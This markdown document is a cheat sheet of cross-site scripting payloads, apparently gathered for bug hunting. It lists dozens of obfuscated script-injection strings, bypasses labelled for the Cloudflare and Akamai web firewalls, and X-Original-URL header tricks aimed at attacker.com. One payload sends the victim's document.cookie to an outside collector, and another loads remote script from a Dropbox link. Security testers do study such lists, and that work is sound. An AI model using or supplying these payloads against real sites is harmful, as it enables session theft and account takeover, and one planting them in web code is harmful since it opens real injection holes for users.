# Custom XSS Payloads
```javascript
<img src=1111111><img src=1111111><a href="javascript:alert(document.domain)">axxx</a><svg></svg><img src=1>
<script /***/>/***/confirm(document.cookie,document.domain)/***/</script /***/
/</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*
<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(document.domain,document.cookie)&NewLine;>X</a>
<iframe onload="javascript:prompt(document.domain)" id="hello" role"world">Hello google
"><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>
returnuri=%09Jav%09ascript:alert(document.domain)
var onskeywords = 'hello';onload=prompt(0);
"hello" onmouseover=prompt(0) world=""
test"t"\t/t%3Ct%3Et
True-Client-IP: <h1>XSS</h1></center><script>alert(document.domain)</script>
"â™ˆ<<sVg/onloadâ™ˆ=/svg/onload=svg/onmouseOver=confirm'1'><!--â™ˆ//="
X-Original-URL: https://attacker.com/
X-Original-URL: test//test\
X-Original-URL: https:\\samcurry.net/please//work
/><svg src=x onload=confirm(document.domain);>
<script>alert(String.fromCharCode(88, 115, 115, 32, 66, 121, 32, 79, 108, 100, 77, 111, 104, 97, 109, 109))</script>
<svg/onload=alert(document.domain)>")
<<!<script>iframe src=javajavascriptscript:alert(document.domain)>
"><svg onload=alert`XSS`>
foo style=animation-name:gl-spinner-rotate onanimationend=alert(1)  -- apply this in profile name section
">svg onx=() onload=(location.href='<BIN>/?mycookies='+document['cookie'])()>
<a"/aonclick=(confirm)()>click
😎<<svg/onload😎=/svg/onload=svg/onmouseOver=confirm'1'><!--😎//="
onhashchange=setTimeout;
Object.prototype.toString=RegExp.prototype.toString;
Object.prototype.source=location.hash;
location.hash=null
'-(a=alert,b="_Yooo!_",[b].find(a))-'
%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
<svg%09%0a%0b%0c%0d%0a%00%20onload=alert(1)>
<iframe src=%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0)">
<script%20~~~>\u0061\u006C\u0065\u0072\u0074''</script%20~~~>
<svg onload='new Function'["_Y000!_"].find(al\u0065rt)''>
<sCRipT>alert(1)</sCRiPt>
<script>%0aalert(1)</script>
<scr<script>ipt<alert(1);</scr<script>ipt>
<input onfocus="alert('xss');" autofocus>
<a/href="j&Tab;a&Tab;v&Tab;asc&Tab;ri&Tab;pi&Tab;pt&Tab;alert&lpar;1&rpar;">
<svg•onload=alert(1)>
<script>alert?.(document?.domain)</script>
"<>onauxclick<>=(eval)(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))>+<sss
<x/onpointerRawupdate=confirm%26Ipar;1)//x
<script src=//⑮.₨></script>
img{background-image:url('javascript:alert()')}
<svg/onload=eval(atob('YWxlcnQoJ1hTUycp'))>
TestPayload&lt;/a&gt;&lt;a href="javascript:alert(1)"&gt;ClickHere&lt;/a&gt; 
<img src=`xx:xx`onerror=alert(1)>
<div/onmouseover='alert(1)'> style="x:">
\";alert('XSS');//
"autofocus/onfocus=alert(1)//
'-alert(1)-'
"><img class="emoji" alt="😯" src="x" /><svg
">'><details/open/ontoggle=confirm(1337)>
%<script>3cscript%<script>3ealert(1)%<script>3c/script%<script>3e
<input disabled=disabled onbeforecopy=alert(1) value=copyme>
</textarea><img src=x onerror=”var pop=’ALERT(document.cookie);’; eval(pop.toLowerCase());”
</script><script>alert('xElkomy')</script>
OnMoUsEoVeR=prompt(/hacked/)//
<b onmouseover=alert('Wufff!')>click me!</b>
"><script>propmt("mamunwhh")</script>
"><script>alert(document.cookie)</script>
/><svg src=x onload=confirm("1337");>
&quot;&gt;&lt;img src=x onerror=confirm(document.domain);&gt;
```

## XSS payload with Alert Obfuscation, for bypass RegEx filters
```js
<img src="X" onerror=top[8680439..toString(30)](1337)>
```

## Logical assignment operators in JavaScript
```js
window&&=(window&&=opener||=alert)?.(1??0,)
```
## Which results alert(1)
```js
𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++],
𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀]
+(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀]
+𒀟][𒁹](𒀃[𒀀]+𒀃[𒈫]+𒉺[𒀆]+𒀟+𒌐+"(𒀀)")()
```
## RXSS
```js
%22%3Cimg%2F**%2Fsrc%3D%22x%22%2F**%2Fonx%3D%22%22%2F**%2Fonerror%3D%22alert%60xss%60%22%3Ef9y60 --encoded
"<img/**/src="x"/**/onx=""/**/onerror="alert`xss`">f9y60 --decoded
OnMoUsEoVeR=prompt(/hacked/)//
```

## Clourflare XSS bypass
```js
<a"/onclick=(confirm)()>Click Here!
%2sscript%2ualert()%2s/script%2u
<svg onload=alert%26%230000000040"1")
<svg onload=prompt%26%230000000040document.domain)>
<svg onload=prompt%26%23x000000028;document.domain)>
```

## When you find input field which allows " (quotes), try this payload:
```js
"autofocus onfocus=alert(1)//
```
-> Doesn't work

**Try this**
```js
"type%3d"text"autofocus%20onfocus%3d"alert(1)"
```
-> Works

## Akami WAF XSS Bypass
```js
xhzeem*/eval?.(value+/()/.source)//"><input value=confirm autofocus onfocus='/*"
```
![img](https://pbs.twimg.com/media/EyDDoO7WYAEJMr6?format=jpg&name=small)

Limited case Akamai WAF bypass
```js
<xhzeem/x=" onmouseover=eva&#x6c;?.(id+/(document.domain)/.source) id=confirm>
```
Works in cases where double quotes are escaped 

`<xhzeem/x=\" ....>`

can also work with single quotes (change it in the payload)
![img](https://pbs.twimg.com/media/Ex-cjUQXIAIRw-y?format=jpg&name=small)

## Stored XSS
```js
&quot;&gt;&lt;img src=x onerror=confirm(document.domain);&gt;
```
